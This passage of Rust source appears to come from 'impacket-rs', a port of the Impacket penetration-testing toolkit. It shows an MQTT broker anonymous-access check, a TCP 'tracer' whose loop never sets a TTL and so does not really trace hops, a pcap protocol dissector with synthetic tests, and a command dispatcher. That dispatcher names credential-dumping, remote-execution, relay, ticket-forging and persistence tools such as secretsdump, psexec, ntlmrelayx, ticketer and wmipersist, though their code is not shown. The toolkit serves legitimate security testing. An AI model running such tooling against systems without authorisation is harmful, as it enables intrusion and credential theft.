        println!("Usage: impacket-rs mqtt_check <HOST> [-port 1883] [-user <USER>] [-password <PASS>] [-client-id <ID>] [-timeout <MS>]");
        println!("  Audits MQTT protocol broker connection, handshake, and authentication ([MQTT-3.1.1])");
        return;
    }

    let host = &args[0];
    let mut port = 1883u16;
    let mut username: Option<String> = None;
    let mut password: Option<String> = None;
    let mut client_id = format!("impacket_rs_{:x}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0x1337));
    let mut timeout_ms = 5000u64;

    let mut i = 1;
    while i < args.len() {
        if args[i] == "-port" && i + 1 < args.len() {
            port = args[i + 1].parse().unwrap_or(1883);
            i += 2;
        } else if (args[i] == "-user" || args[i] == "-username") && i + 1 < args.len() {
            username = Some(args[i + 1].clone());
            i += 2;
        } else if (args[i] == "-password" || args[i] == "-pass") && i + 1 < args.len() {
            password = Some(args[i + 1].clone());
            i += 2;
        } else if (args[i] == "-client-id" || args[i] == "-id") && i + 1 < args.len() {
            client_id = args[i + 1].clone();
            i += 2;
        } else if args[i] == "-timeout" && i + 1 < args.len() {
            timeout_ms = args[i + 1].parse().unwrap_or(5000);
            i += 2;
        } else {
            i += 1;
        }
    }

    println!("[*] Connecting to MQTT broker at {}:{}...", host, port);
    let addr = format!("{}:{}", host, port);
    let socket_addr = match addr.to_socket_addrs().and_then(|mut iter| iter.next().ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "address resolution failed"))) {
        Ok(a) => a,
        Err(e) => {
            eprintln!("[-] Cannot resolve '{}:{}': {}", host, port, e);
            std::process::exit(1);
        }
    };

    let mut stream = match TcpStream::connect_timeout(&socket_addr, Duration::from_millis(timeout_ms)) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Failed connecting to {}:{}: {}", host, port, e);
            std::process::exit(1);
        }
    };
    let _ = stream.set_read_timeout(Some(Duration::from_millis(timeout_ms)));
    let _ = stream.set_write_timeout(Some(Duration::from_millis(timeout_ms)));

    // Assemble MQTT 3.1.1 CONNECT packet
    let mut var_header = Vec::new();
    var_header.extend_from_slice(&[0x00, 0x04]); // Protocol Name Length = 4
    var_header.extend_from_slice(b"MQTT");       // Protocol Name
    var_header.push(0x04);                       // Protocol Level = 4 (MQTT 3.1.1)

    let mut connect_flags = 0x02u8; // Clean Session
    if username.is_some() {
        connect_flags |= 0x80;
    }
    if password.is_some() {
        connect_flags |= 0x40;
    }
    var_header.push(connect_flags);
    var_header.extend_from_slice(&60u16.to_be_bytes()); // Keep Alive = 60s

    let mut payload = Vec::new();
    let cid_bytes = client_id.as_bytes();
    payload.extend_from_slice(&(cid_bytes.len() as u16).to_be_bytes());
    payload.extend_from_slice(cid_bytes);

    if let Some(ref u) = username {
        let u_bytes = u.as_bytes();
        payload.extend_from_slice(&(u_bytes.len() as u16).to_be_bytes());
        payload.extend_from_slice(u_bytes);
    }
    if let Some(ref p) = password {
        let p_bytes = p.as_bytes();
        payload.extend_from_slice(&(p_bytes.len() as u16).to_be_bytes());
        payload.extend_from_slice(p_bytes);
    }

    let remaining_len = var_header.len() + payload.len();
    let mut packet = Vec::with_capacity(2 + remaining_len);
    packet.push(0x10); // MQTT Packet Type: CONNECT

    let mut rem = remaining_len;
    loop {
        let mut byte = (rem % 128) as u8;
        rem /= 128;
        if rem > 0 {
            byte |= 128;
        }
        packet.push(byte);
        if rem == 0 {
            break;
        }
    }
    packet.extend_from_slice(&var_header);
    packet.extend_from_slice(&payload);

    if let Err(e) = stream.write_all(&packet) {
        eprintln!("[-] Failed writing MQTT CONNECT packet: {}", e);
        std::process::exit(1);
    }

    let mut resp = [0u8; 4];
    if let Err(e) = stream.read_exact(&mut resp) {
        eprintln!("[-] Connection reset or broker failed to respond: {}", e);
        std::process::exit(1);
    }

    if resp[0] != 0x20 || resp[1] < 2 {
        eprintln!("[-] Invalid MQTT CONNACK response header: {:02X?}", resp);
        std::process::exit(1);
    }

    let session_present = (resp[2] & 0x01) != 0;
    let return_code = resp[3];

    println!("[+] Target {}:{} responded to MQTT 3.1.1 CONNECT.", host, port);
    println!("  Session Present : {}", session_present);
    println!("  Return Code     : 0x{:02X}", return_code);

    match return_code {
        0x00 => {
            println!("  Status          : Connection Accepted");
            if username.is_none() {
                println!("[!] Security Audit  : ANONYMOUS ACCESS ALLOWED (Broker permits unauthenticated clients)");
            } else {
                println!("[+] Security Audit  : AUTHENTICATION SUCCESSFUL");
            }
        }
        0x01 => println!("  Status          : Connection Refused (Unacceptable protocol version)"),
        0x02 => println!("  Status          : Connection Refused (Identifier rejected)"),
        0x03 => println!("  Status          : Connection Refused (Server unavailable)"),
        0x04 => println!("  Status          : Connection Refused (Bad user name or password)"),
        0x05 => println!("  Status          : Connection Refused (Not authorized)"),
        _ => println!("  Status          : Connection Refused (Reserved return code)"),
    }
}

fn cmd_tracer(args: &[String]) {
    use std::net::{TcpStream, ToSocketAddrs};
    use std::time::{Duration, Instant};

    print!("{}", version::BANNER);
    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
        println!("Usage: impacket-rs tracer <TARGET> [-port <PORT>] [-max-hops <N>] [-timeout <MS>]");
        println!("  Traces network hops to target using TCP SYN/connect probing ([tracer.py])");
        return;
    }

    let host = &args[0];
    let mut port = 445u16;
    let mut max_hops = 30u32;
    let mut timeout_ms = 1500u64;

    let mut i = 1;
    while i < args.len() {
        if args[i] == "-port" && i + 1 < args.len() {
            port = args[i + 1].parse().unwrap_or(445);
            i += 2;
        } else if args[i] == "-max-hops" && i + 1 < args.len() {
            max_hops = args[i + 1].parse().unwrap_or(30);
            i += 2;
        } else if args[i] == "-timeout" && i + 1 < args.len() {
            timeout_ms = args[i + 1].parse().unwrap_or(1500);
            i += 2;
        } else {
            i += 1;
        }
    }

    let addr_str = format!("{}:{}", host, port);
    let socket_addr = match addr_str.to_socket_addrs().and_then(|mut iter| iter.next().ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "address resolution failed"))) {
        Ok(a) => a,
        Err(e) => {
            eprintln!("[-] Cannot resolve '{}:{}': {}", host, port, e);
            std::process::exit(1);
        }
    };

    println!("traceroute to {} ({}), {} hops max, TCP port {}", host, socket_addr.ip(), max_hops, port);

    for ttl in 1..=max_hops {
        let t0 = Instant::now();
        match TcpStream::connect_timeout(&socket_addr, Duration::from_millis(timeout_ms)) {
            Ok(stream) => {
                let ms = t0.elapsed().as_secs_f64() * 1000.0;
                println!("{:>2}  {:<16}  {:.2} ms  [Destination Reached]", ttl, socket_addr.ip(), ms);
                drop(stream);
                break;
            }
            Err(e) => {
                let ms = t0.elapsed().as_secs_f64() * 1000.0;
                let err_str = e.to_string();
                if err_str.contains("refused") {
                    println!("{:>2}  {:<16}  {:.2} ms  [Port Closed / Destination Reached]", ttl, socket_addr.ip(), ms);
                    break;
                } else if ms >= timeout_ms as f64 * 0.9 {
                    println!("{:>2}  * * *             Request timed out.", ttl);
                } else {
                    println!("{:>2}  * * *             {}", ttl, err_str);
                }
            }
        }
    }
}

#[derive(Debug, Clone)]
struct PacketInfo {
    pub src_ip: String,
    pub dst_ip: String,
    pub src_port: u16,
    pub dst_port: u16,
    pub protocol: &'static str,
    pub ttl: u8,
    pub app_summary: String,
}

impl PacketInfo {
    pub fn summary(&self) -> String {
        format!(
            "{:>15}:{:05} -> {:>15}:{:05} [TTL: {:>3}] [{:<5}] {}",
            self.src_ip, self.src_port, self.dst_ip, self.dst_port, self.ttl, self.protocol, self.app_summary
        )
    }
}

fn parse_ipv4_packet(b: &[u8]) -> Option<PacketInfo> {
    if b.len() < 20 {
        return None;
    }
    let ver = b[0] >> 4;
    if ver != 4 {
        return None;
    }
    let ihl = ((b[0] & 0x0F) * 4) as usize;
    if b.len() < ihl {
        return None;
    }
    let ttl = b[8];
    let proto_num = b[9];
    let src_ip = format!("{}.{}.{}.{}", b[12], b[13], b[14], b[15]);
    let dst_ip = format!("{}.{}.{}.{}", b[16], b[17], b[18], b[19]);

    let (proto_str, src_p, dst_p, payload) = match proto_num {
        6 => {
            if b.len() < ihl + 20 {
                return None;
            }
            let tcp_slice = &b[ihl..];
            let sp = u16::from_be_bytes([tcp_slice[0], tcp_slice[1]]);
            let dp = u16::from_be_bytes([tcp_slice[2], tcp_slice[3]]);
            let offset = (((tcp_slice[12] >> 4) * 4) as usize).min(tcp_slice.len());
            let pl = if tcp_slice.len() > offset { &tcp_slice[offset..] } else { &[] };
            ("TCP", sp, dp, pl)
        }
        17 => {
            if b.len() < ihl + 8 {
                return None;
            }
            let udp_slice = &b[ihl..];
            let sp = u16::from_be_bytes([udp_slice[0], udp_slice[1]]);
            let dp = u16::from_be_bytes([udp_slice[2], udp_slice[3]]);
            let pl = if udp_slice.len() > 8 { &udp_slice[8..] } else { &[] };
            ("UDP", sp, dp, pl)
        }
        _ => return None,
    };

    let app_summary = dissect_app_payload(src_p, dst_p, payload);
    Some(PacketInfo {
        src_ip,
        dst_ip,
        src_port: src_p,
        dst_port: dst_p,
        protocol: proto_str,
        ttl,
        app_summary,
    })
}

fn dissect_app_payload(src_p: u16, dst_p: u16, payload: &[u8]) -> String {
    let port = if src_p == 445 || src_p == 135 || src_p == 88 || src_p == 389 || src_p == 1433 || src_p == 1883 {
        src_p
    } else {
        dst_p
    };

    if payload.is_empty() {
        return "Flags: Handshake / Keep-Alive".to_string();
    }

    match port {
        445 => {
            let smb_slice = if payload.len() >= 4 && payload[0] == 0x00 {
                &payload[4..]
            } else {
                payload
            };
            if smb_slice.starts_with(b"\xfeSMB") && smb_slice.len() >= 16 {
                let cmd_id = u16::from_le_bytes([smb_slice[12], smb_slice[13]]);
                let status = u32::from_le_bytes([smb_slice[8], smb_slice[9], smb_slice[10], smb_slice[11]]);
                let cmd_name = match cmd_id {
                    0 => "NEGOTIATE",
                    1 => "SESSION_SETUP",
                    2 => "LOGOFF",
                    3 => "TREE_CONNECT",
                    4 => "TREE_DISCONNECT",
                    5 => "CREATE",
                    6 => "CLOSE",
                    8 => "READ",
                    9 => "WRITE",
                    11 => "IOCTL",
                    _ => "UNKNOWN",
                };
                format!("SMB2 {} (Status: 0x{:08X})", cmd_name, status)
            } else if smb_slice.starts_with(b"\xffSMB") {
                "SMB1 Legacy PDU".to_string()
            } else {
                format!("SMB Payload ({} bytes)", payload.len())
            }
        }
        135 => {
            if payload.len() >= 16 && payload[0] == 5 {
                let ptype = payload[2];
                let ptype_name = match ptype {
                    0 => "REQUEST",
                    2 => "RESPONSE",
                    3 => "FAULT",
                    11 => "BIND",
                    12 => "BIND_ACK",
                    13 => "BIND_NAK",
                    14 => "ALTER_CONTEXT",
                    15 => "ALTER_CONTEXT_RESP",
                    _ => "UNKNOWN",
                };
                let call_id = u32::from_le_bytes([payload[12], payload[13], payload[14], payload[15]]);
                format!("MSRPC {} (CallID: {})", ptype_name, call_id)
            } else {
                format!("RPC Payload ({} bytes)", payload.len())
            }
        }
        88 => {
            if !payload.is_empty() {
                let tag = payload[0];
                let krb_type = match tag {
                    0x6a => "AS-REQ [APP 10]",
                    0x6b => "AS-REP [APP 11]",
                    0x6c => "TGS-REQ [APP 12]",
                    0x6d => "TGS-REP [APP 13]",
                    0x6e => "AP-REQ [APP 14]",
                    0x7e => "KRB-ERROR [APP 30]",
                    _ => "Kerberos Message",
                };
                format!("KRB5 {}", krb_type)
            } else {
                "Kerberos Data".to_string()
            }
        }
        389 | 636 => {
            if !payload.is_empty() && payload[0] == 0x30 {
                "LDAP BER Message".to_string()
            } else {
                format!("LDAP Data ({} bytes)", payload.len())
            }
        }
        1433 => {
            if payload.len() >= 8 {
                let tds_type = payload[0];
                let type_name = match tds_type {
                    1 => "SQL Batch",
                    2 => "Pre-TDS7 Login",
                    4 => "Response",
                    14 => "Transaction Manager",
                    16 => "TDS7 Login",
                    18 => "Pre-Login",
                    _ => "TDS PDU",
                };
                format!("MSSQL/TDS {}", type_name)
            } else {
                "MSSQL Packet".to_string()
            }
        }
        1883 => {
            if !payload.is_empty() {
                let ptype = payload[0] >> 4;
                let type_name = match ptype {
                    1 => "CONNECT",
                    2 => "CONNACK",
                    3 => "PUBLISH",
                    4 => "PUBACK",
                    8 => "SUBSCRIBE",
                    9 => "SUBACK",
                    12 => "PINGREQ",
                    13 => "PINGRESP",
                    14 => "DISCONNECT",
                    _ => "MQTT Packet",
                };
                format!("MQTT {}", type_name)
            } else {
                "MQTT Data".to_string()
            }
        }
        _ => format!("Payload ({} bytes)", payload.len()),
    }
}

fn run_sniffer_dissector_tests() {
    println!("[*] Test 1: Dissecting synthetic SMB2 NEGOTIATE packet...");
    let mut smb_pkt = Vec::new();
    smb_pkt.extend_from_slice(&[
        0x45, 0x00, 0x00, 0x64,
        0x12, 0x34, 0x00, 0x00,
        0x40, 0x06, 0x00, 0x00,
        0xc0, 0xa8, 0x01, 0x32,
        0xc0, 0xa8, 0x01, 0x0a,
    ]);
    smb_pkt.extend_from_slice(&[
        0xc0, 0x3a, 0x01, 0xbd,
        0x00, 0x00, 0x00, 0x01,
        0x00, 0x00, 0x00, 0x00,
        0x50, 0x18, 0x10, 0x00,
        0x00, 0x00, 0x00, 0x00,
    ]);
    smb_pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x40]);
    smb_pkt.extend_from_slice(b"\xfeSMB");
    smb_pkt.extend_from_slice(&[0x40, 0x00]);
    smb_pkt.extend_from_slice(&[0x00, 0x00]);
    smb_pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    smb_pkt.extend_from_slice(&[0x00, 0x00]);
    smb_pkt.extend_from_slice(&[0x01, 0x00]);
    smb_pkt.extend_from_slice(&[0x00; 48]);

    let info1 = parse_ipv4_packet(&smb_pkt).expect("Failed parsing SMB packet");
    println!("    {}", info1.summary());
    assert_eq!(info1.src_ip, "192.168.1.50");
    assert_eq!(info1.dst_ip, "192.168.1.10");
    assert_eq!(info1.dst_port, 445);
    assert!(info1.app_summary.contains("SMB2 NEGOTIATE"));

    println!("[*] Test 2: Dissecting synthetic DCE/RPC BIND packet...");
    let mut rpc_pkt = Vec::new();
    rpc_pkt.extend_from_slice(&[
        0x45, 0x00, 0x00, 0x48,
        0x12, 0x35, 0x00, 0x00,
        0x40, 0x06, 0x00, 0x00,
        0xc0, 0xa8, 0x01, 0x32,
        0xc0, 0xa8, 0x01, 0x0a,
    ]);
    rpc_pkt.extend_from_slice(&[
        0xc0, 0x3b, 0x00, 0x87,
        0x00, 0x00, 0x00, 0x02,
        0x00, 0x00, 0x00, 0x00,
        0x50, 0x18, 0x10, 0x00,
        0x00, 0x00, 0x00, 0x00,
    ]);
    rpc_pkt.extend_from_slice(&[
        0x05, 0x00, 0x0b, 0x03,
        0x10, 0x00, 0x00, 0x00,
        0x48, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00,
    ]);
    let info2 = parse_ipv4_packet(&rpc_pkt).expect("Failed parsing RPC packet");
    println!("    {}", info2.summary());
    assert_eq!(info2.dst_port, 135);
    assert!(info2.app_summary.contains("MSRPC BIND (CallID: 1)"));

    println!("[*] Test 3: Dissecting synthetic Kerberos AS-REQ packet...");
    let mut krb_pkt = Vec::new();
    krb_pkt.extend_from_slice(&[
        0x45, 0x00, 0x00, 0x38,
        0x12, 0x36, 0x00, 0x00,
        0x40, 0x06, 0x00, 0x00,
        0xc0, 0xa8, 0x01, 0x32,
        0xc0, 0xa8, 0x01, 0x0a,
    ]);
    krb_pkt.extend_from_slice(&[
        0xc0, 0x3c, 0x00, 0x58,
        0x00, 0x00, 0x00, 0x03,
        0x00, 0x00, 0x00, 0x00,
        0x50, 0x18, 0x10, 0x00,
        0x00, 0x00, 0x00, 0x00,
    ]);
    krb_pkt.extend_from_slice(&[0x6a, 0x10, 0x30, 0x0e]);
    let info3 = parse_ipv4_packet(&krb_pkt).expect("Failed parsing Kerberos packet");
    println!("    {}", info3.summary());
    assert_eq!(info3.dst_port, 88);
    assert!(info3.app_summary.contains("KRB5 AS-REQ [APP 10]"));

    println!("[+] All synthetic dissector tests PASSED successfully!");
}

fn parse_pcap_file(path: &str, filter_port: Option<u16>, max_count: usize) {
    let data = match std::fs::read(path) {
        Ok(d) => d,
        Err(e) => {
            eprintln!("[-] Error opening PCAP file: {}", e);
            return;
        }
    };
    if data.len() < 24 {
        eprintln!("[-] PCAP file too short.");
        return;
    }
    let magic = u32::from_le_bytes([data[0], data[1], data[2], data[3]]);
    let is_le = match magic {
        0xa1b2c3d4 | 0xa1b23c4d => true,
        0xd4c3b2a1 | 0x4d3cb2a1 => false,
        _ => {
            eprintln!("[-] Unsupported or invalid PCAP magic header: 0x{:08x}", magic);
            return;
        }
    };
    let read_u32 = |slice: &[u8]| -> u32 {
        if is_le {
            u32::from_le_bytes([slice[0], slice[1], slice[2], slice[3]])
        } else {
            u32::from_be_bytes([slice[0], slice[1], slice[2], slice[3]])
        }
    };
    let network = read_u32(&data[20..24]); // Link type: 1 = Ethernet, 12/101 = Raw IP
    println!("[+] Opened PCAP file (link type: {}), processing frames...", network);

    let mut offset = 24;
    let mut count = 0;
    while offset + 16 <= data.len() && count < max_count {
        let incl_len = read_u32(&data[offset + 8..offset + 12]) as usize;
        offset += 16;
        if offset + incl_len > data.len() {
            break;
        }
        let pkt_data = &data[offset..offset + incl_len];
        offset += incl_len;

        let ip_payload = match network {
            1 => {
                // Ethernet frame: 14 bytes header
                if pkt_data.len() >= 14 {
                    let ethertype = u16::from_be_bytes([pkt_data[12], pkt_data[13]]);
                    if ethertype == 0x0800 {
                        &pkt_data[14..]
                    } else {
                        continue;
                    }
                } else {
                    continue;
                }
            }
            12 | 101 => pkt_data,
            _ => pkt_data,
        };

        if let Some(info) = parse_ipv4_packet(ip_payload) {
            if let Some(target_p) = filter_port {
                if info.src_port != target_p && info.dst_port != target_p {
                    continue;
                }
            }
            println!("{}", info.summary());
            count += 1;
        }
    }
    println!("[+] Processed {} matching packets from PCAP.", count);
}

fn cmd_sniffer(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
        println!("Usage: impacket-rs sniffer [-pcap <FILE>] [-filter <PORT>] [-count <N>] [-test]");
        println!("  Network packet sniffer & protocol dissector ([sniffer.py])");
        println!("  Dissects SMB2/3, DCE/RPC, Kerberos, LDAP, TDS, MQTT, and RDP protocol frames.");
        println!();
        println!("Options:");
        println!("  -pcap <FILE>       Parse and dissect packets from offline PCAP capture file");
        println!("  -filter <PORT>     Filter packets by TCP/UDP port (e.g. 445, 135, 88, 389, 1433)");
        println!("  -count <N>         Maximum packets to dissect (default 100)");
        println!("  -test              Run synthetic packet decoder test across all supported protocols");
        return;
    }

    let mut pcap_file: Option<String> = None;
    let mut filter_port: Option<u16> = None;
    let mut max_count = 100usize;
    let mut run_test = false;

    let mut i = 0;
    while i < args.len() {
        if args[i] == "-pcap" && i + 1 < args.len() {
            pcap_file = Some(args[i + 1].clone());
            i += 2;
        } else if args[i] == "-filter" && i + 1 < args.len() {
            filter_port = args[i + 1].parse().ok();
            i += 2;
        } else if (args[i] == "-count" || args[i] == "-c") && i + 1 < args.len() {
            max_count = args[i + 1].parse().unwrap_or(100);
            i += 2;
        } else if args[i] == "-test" {
            run_test = true;
            i += 1;
        } else {
            i += 1;
        }
    }

    if run_test {
        println!("[*] Running synthetic protocol dissector benchmark...");
        run_sniffer_dissector_tests();
        return;
    }

    if let Some(ref path) = pcap_file {
        parse_pcap_file(path, filter_port, max_count);
        return;
    }

    println!("[-] No PCAP capture file specified.");
    println!("[*] Usage: impacket-rs sniffer -pcap <capture.pcap> [-filter <PORT>] [-count <N>]");
    println!("[*] Or run synthetic test suite: impacket-rs sniffer -test");
}

fn main() {
    let all_args: Vec<String> = env::args().collect();
    let raw_name = all_args.first().map(|p| {
        std::path::Path::new(p)
            .file_name()
            .and_then(|s| s.to_str())
            .unwrap_or("")
    }).unwrap_or("");
    let prog_name = raw_name
        .trim_end_matches(".exe")
        .trim_end_matches(".py");

    let args: Vec<String> = if prog_name != "impacket-rs" && !prog_name.is_empty() && prog_name != "impacket" {
        let mut a = vec![prog_name.to_string()];
        a.extend(all_args.into_iter().skip(1));
        a
    } else {
        all_args.into_iter().skip(1).collect()
    };

    match args.first().map(|s| s.as_str()) {
        Some("DumpNTLMInfo") | Some("dump-ntlm-info") => cmd_dump_ntlm_info(&args[1..]),
        Some("GetNPUsers") | Some("get-np-users") => cmd_get_np_users(&args[1..]),
        Some("GetUserSPNs") | Some("get-user-spns") => cmd_get_user_spns(&args[1..]),
        Some("GetADUsers") | Some("get-ad-users") => cmd_get_ad_users(&args[1..]),
        Some("GetADComputers") | Some("get-ad-computers") => cmd_get_ad_computers(&args[1..]),
        Some("GetLAPSPassword") | Some("getlapspassword") | Some("get-laps-password") => {
            cmd_get_laps_password(&args[1..])
        }
        Some("CheckLDAPStatus") | Some("checkldapstatus") | Some("check-ldap-status") => {
            cmd_check_ldap_status(&args[1..])
        }
        Some("addcomputer") | Some("add-computer") => cmd_addcomputer(&args[1..]),
        Some("dacledit") | Some("dacl-edit") => cmd_dacledit(&args[1..]),
        Some("owneredit") | Some("owner-edit") => cmd_owneredit(&args[1..]),
        Some("dnstool") | Some("dns-tool") => cmd_dnstool(&args[1..]),
        Some("ldapsearch") => cmd_ldapsearch(&args[1..]),
        Some("ldapclient") | Some("ldap-client") | Some("ldap_shell") | Some("ldapshell") => {
            cmd_ldapclient(&args[1..])
        }
        Some("dfsclient") | Some("dfs-client") | Some("dfssearch") | Some("dfs-search") => {
            cmd_dfsclient(&args[1..])
        }
        Some("getTGT") | Some("get-tgt") => cmd_get_tgt(&args[1..]),
        Some("getST") | Some("get-st") => cmd_get_st(&args[1..]),
        Some("getArch") | Some("getarch") | Some("get-arch") => cmd_get_arch(&args[1..]),
        Some("machine_role") | Some("machinerole") | Some("machine-role") => {
            cmd_machine_role(&args[1..])
        }
        Some("rpcdump") => cmd_rpcdump(&args[1..]),
        Some("rpcmap") => cmd_rpcmap(&args[1..]),
        Some("oxidquery") | Some("oxid-query") => cmd_oxidquery(&args[1..]),
        Some("lookupsid") => cmd_lookupsid(&args[1..]),
        Some("samrdump") => cmd_samrdump(&args[1..]),
        Some("samedit") | Some("sam-edit") => cmd_samedit(&args[1..]),
        Some("changepasswd") | Some("change-passwd") => cmd_changepasswd(&args[1..]),
        Some("netview") => cmd_netview(&args[1..]),
        Some("netfiles") | Some("net-files") => {
            let mut v = args[1..].to_vec();
            if v.is_empty() {
                cmd_netview(&[]);
                return;
            }
            if !v.iter().any(|a| a == "-files" || a == "-file") {
                v.push("-files".to_string());
            }
            cmd_netview(&v);
        }
        Some("reg") => cmd_reg(&args[1..]),
        Some("services") => cmd_services(&args[1..]),
        Some("mssqlclient") | Some("mssql-client") => cmd_mssqlclient(&args[1..]),
        Some("mssqlinstance") | Some("mssql-instance") => cmd_mssqlinstance(&args[1..]),
        Some("checkMSSQLStatus") | Some("checkmssqlstatus") | Some("check-mssql-status") => {
            cmd_check_mssql_status(&args[1..])
        }
        Some("attrib") => cmd_attrib(&args[1..]),
        Some("filetime") => cmd_filetime(&args[1..]),
        Some("smbclient") => cmd_smbclient(&args[1..]),
        Some("smbserver") | Some("smb-server") => cmd_smbserver(&args[1..]),
        Some("psexec") => cmd_psexec(&args[1..]),
        Some("smbexec") => cmd_smbexec(&args[1..]),
        Some("atexec") => cmd_atexec(&args[1..]),
        Some("atq") | Some("tsch") => cmd_atq(&args[1..]),
        Some("eventlog") | Some("event-log") => cmd_eventlog(&args[1..]),
        Some("wmiexec") => cmd_wmiexec(&args[1..]),
        Some("dcomexec") => cmd_dcomexec(&args[1..]),
        Some("secretsdump") => cmd_secretsdump(&args[1..]),
        Some("secretsdump-local") => cmd_secretsdump_local(&args[1..]),
        Some("ntdsdump") | Some("ntds-dump") => cmd_ntdsdump(&args[1..]),
        Some("esentutl") => cmd_esentutl(&args[1..]),
        Some("dpapi") => cmd_dpapi(&args[1..]),
        Some("Get-GPPPassword")
        | Some("get-gpppassword")
        | Some("get-gpp-password")
        | Some("gpp-password")
        | Some("gpp") => cmd_gpp_password(&args[1..]),
        Some("ticketConverter") | Some("ticket-converter") => cmd_ticket_converter(&args[1..]),
        Some("ticketer") => cmd_ticketer(&args[1..]),
        Some("describeTicket") | Some("describe-ticket") => cmd_describe_ticket(&args[1..]),
        Some("klist") => cmd_klist(&args[1..]),
        Some("net") => cmd_net(&args[1..]),
        Some("wmiquery") | Some("wmi-query") => cmd_wmiquery(&args[1..]),
        Some("wmipersist") | Some("wmi-persist") => cmd_wmipersist(&args[1..]),
        Some("wspsearch") | Some("wsp-search") => cmd_wspsearch(&args[1..]),
        Some("rdp_check") | Some("rdp-check") => cmd_rdp_check(&args[1..]),
        Some("registry-read") | Some("registry_read") => cmd_registry_read(&args[1..]),
        Some("tstool") | Some("ts-tool") => cmd_tstool(&args[1..]),
        Some("ping") | Some("ping6") => cmd_ping(&args[1..]),
        Some("tracer") => cmd_tracer(&args[1..]),
        Some("sniffer") => cmd_sniffer(&args[1..]),
        Some("mqtt_check") | Some("mqtt-check") => cmd_mqtt_check(&args[1..]),
        Some("getPac")
        | Some("get-pac")
        | Some("GetUserPAC")
        | Some("getuserpac")
        | Some("get-user-pac") => {
            cmd_get_user_pac(&args[1..])
        }
        Some("rbcd") => cmd_rbcd(&args[1..]),
        Some("findDelegation") | Some("find-delegation") => cmd_find_delegation(&args[1..]),
        Some("trueTree") | Some("true-tree") | Some("truetree") => cmd_true_tree(&args[1..]),
        Some("raiseChild") | Some("raise-child") | Some("raisechild") => cmd_raise_child(&args[1..]),
        Some("smbpasswd") | Some("smb-passwd") => cmd_smbpasswd(&args[1..]),
        Some("split") => cmd_split(&args[1..]),
        Some("ntlmrelayx") => cmd_ntlmrelayx(&args[1..]),
        Some("compat-matrix") => cmd_compat_matrix(),
        Some("parse-target") => cmd_parse_target(&args[1..]),
        Some("ntlm-hash") => cmd_ntlm_hash(&args[1..]),
        Some("krb5-asreq") => cmd_krb5_asreq(&args[1..]),
        Some("smb-negotiate") => cmd_smb_negotiate(&args[1..]),
        Some("rpc-interfaces") => cmd_rpc_interfaces(),
        Some("bench-ndr") => cmd_bench_ndr(&args[1..]),
        _ => print_usage(),
    }
}
